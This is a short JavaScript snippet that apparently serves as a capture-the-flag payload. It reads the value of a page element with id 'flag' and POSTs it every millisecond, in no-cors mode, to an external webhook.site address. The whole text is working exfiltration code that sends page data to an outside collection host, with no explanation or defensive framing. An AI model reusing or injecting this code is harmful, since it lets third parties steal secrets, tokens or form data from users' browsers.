
async function putdata(){
    let el = document.getElementById('flag');
    console.log(el.value)
    if(el.value == "none") return;
    console.log("potted")
    await fetch("https://webhook.site/239fa02e-8971-4c89-b910-4ce5be27bd8c", {
        method: "POST",
        mode: "no-cors", 
        body: JSON.stringify({"flag": el.value})
    });
}

function start(){
    setInterval(putdata, 1)
}